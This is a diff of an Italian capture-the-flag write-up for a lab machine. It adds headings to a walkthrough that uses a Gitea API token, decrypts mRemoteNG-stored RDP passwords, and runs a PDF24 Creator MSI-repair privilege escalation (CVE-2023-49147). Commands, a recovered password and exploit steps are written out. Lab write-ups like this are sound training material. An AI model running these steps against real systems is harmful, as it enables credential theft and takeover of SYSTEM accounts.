@@ -222,11 +222,13 @@ Repositories:
 - ellen.freeman/website
 ```
 
+## **Deep Information Gathering via Gitea**
+
 Si può interagire con l'API di Gitea anche tramite **Swagger**.
 
 ![07](./img/07.png)
 
-Si inserisce il **token** e si interroga l'API per accedere al repository **website**.
+Si inserisce il **token** e si interroga l'API per accedere al contenuto del repository **website**.
 
 ![08](./img/08.png)
 
@@ -277,7 +279,7 @@ $ git commit -m "."
 $ git push
 ```
 
-Si verifica il risultato tramite l'API.
+Si verifica il risultato della **git push** tramite l'API.
 ```bash
 $ curl -X 'GET' \
   'http://lock:3000/api/v1/repos/ellen.freeman/website/contents/.?token=43ce39bb0bd6bc489284f2905f033ca467a6362f' \
@@ -411,6 +413,8 @@ Si visionano i programmi presenti nel sistema.
 ```
 
 I file di configurazione di **mRemoteNG** potrebbero contenere delle credenziali.
+
+## **Password Exfiltration via mRemoteNG configuration file**
 ```
 > dir C:\Users\ellen.freeman\AppData\Roaming\mRemoteNG
 
@@ -450,6 +454,7 @@ Si scarica il file **confCons.xml**.
 
 E' presente la password per RDP dell'utente **gale.dekarios**.
 
+### Password Decryption
 Si utilizza lo script **mremoteng_decrypt.py** del repository [https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper](https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper) per tentare di decifrare a password con la chiave di default **mR3m**.
 ```bash
 $ python3 mremoteng_decrypt.py -s 'LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qCeyyO1vVrOCRxJ/LXe6TmDmr6ZTbNr3Br5oMtLCclw==' -p 'mR3m'
@@ -458,9 +463,12 @@ $ python3 mremoteng_decrypt.py -s 'LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qC
 Password: ty8wnW9qCKDosXo6
 ```
 
+### RDP via gale.dekarios
 Si accede tramite RDP con le credenziali **gale.dekarios:ty8wnW9qCKDosXo6** e al contenuto del file **user.txt**.
 
 ![13](./img/13.png)
+
+## **Privilege Escalation**
 
 Sulla macchina è presente il software **PDF24 Creator** per la creazione di file PDF. 
 
@@ -468,7 +476,7 @@ Sulla macchina è presente il software **PDF24 Creator** per la creazione di fil
 
 La versione installata di **PDF24 Creator** è la **11.15.1**.
 
-## **CVE-2023-49147**
+### CVE-2023-49147
 PDF24 Creator 1.15.1 ha una vulnerabilità che permette una **Local Privilege Escalation** per mezzo di **MSI installer**. Il file di configurazione di PDF24 Creator MSI installer crea una finestra cmd.exe (temporanea) come SYSTEM user quando si utilizza la funzione repair di misexec.exe. 
 
 > **Exploit for PDF24 Creator 11.15.1 Local Privilege Escalation CVE-2023-49147 di Sploitus** [https://sploitus.com/exploit?id=PACKETSTORM:176206](https://sploitus.com/exploit?id=PACKETSTORM:176206)
@@ -512,8 +520,7 @@ $ 7z e Release.7z SetOpLock.exe
 
 ![16](./img/16.png)
 
-Si esegue l'exploit.
-
+### Exploitation
 ```powershell
 # Run repair MSI installer
 msiexec.exe /fa C:\_install\pdf24-creator-11.14.0-x64.msi  
@@ -539,6 +546,8 @@ Si avvia una shell privilegiata:
 Si apre una shell dal browser Firefox (Ctrl+o).
 
 ![22](./img/22.png)
+
+### Shell as system
 
 ![23](./img/23.png)
 
